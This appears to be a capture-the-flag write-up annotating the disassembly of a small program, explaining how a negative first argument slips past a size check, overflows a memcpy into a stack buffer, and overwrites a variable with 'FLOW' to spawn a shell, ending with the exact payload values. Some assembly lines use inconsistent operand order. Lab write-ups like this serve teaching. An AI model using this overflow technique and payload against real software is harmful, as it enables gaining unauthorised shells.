main function analysis

function prologue
push ebp
save old base pointer

mov esp, ebp
set new stack frame

and esp, 0xfffffff0
align stack to 16 bytes

sub esp, 0x40
allocate 64 bytes on stack

getting argv[1]

mov 0xc(ebp), eax
load argv address

add eax, 0x4
move to argv[1]

mov (eax), eax
eax now points to argv[1] string

mov eax, (esp)
prepare argument for atoi

call atoi
convert argv[1] to integer

mov eax, 0x3c(esp)
store result in local variable

check if value > 9

cmp 0x3c(esp), 9
compare input with 9

jle continue
if value <= 9 continue

mov eax, 1
otherwise return 1

jmp end
exit program

compute size = value * 4

mov eax, 0x3c(esp)
load input value

lea ecx, eax * 4
multiply by 4

getting argv[2]

mov eax, 0xc(ebp)
load argv

add eax, 0x8
move to argv[2]

mov (eax), eax
eax now points to argv[2]

mov edx, eax
store source pointer

prepare memcpy

lea eax, 0x14(esp)
destination buffer on stack

mov 0x8(esp), ecx
size to copy

mov 0x4(esp), edx
source

mov (esp), eax
destination

call memcpy
copy size bytes from argv[2] to stack buffer

critical vulnerability

no bounds check on size
size comes from user input
negative values bypass the check
negative value * 4 becomes very large (integer overflow)
this causes memcpy to overflow the stack

check for magic value

cmp 0x3c(esp), 0x574f4c46
compare input with magic number

0x574f4c46 equals "FLOW" in ASCII

jne skip
if not equal skip

execute shell

mov 0x8(esp), 0
third argument NULL

mov 0x4(esp), 0x8048580
second argument string

mov (esp), 0x8048583
first argument string

call execl
execute program (likely /bin/sh)

normal exit

mov eax, 0
return 0

leave
restore stack

ret
return

exploit logic summary

program limits input to <= 9
but negative numbers pass the check
negative number * 4 becomes huge due to integer overflow
memcpy copies huge data and overflows stack
overflow overwrites stored value at 0x3c(esp)
we overwrite it with 0x574f4c46 which is "FLOW"
this triggers execl and spawns a shell

your payload explained

-1073741813 is chosen so value * 4 overflows
'A' * 40 fills buffer
'FLOW' overwrites the target variable
this makes condition true and executes shell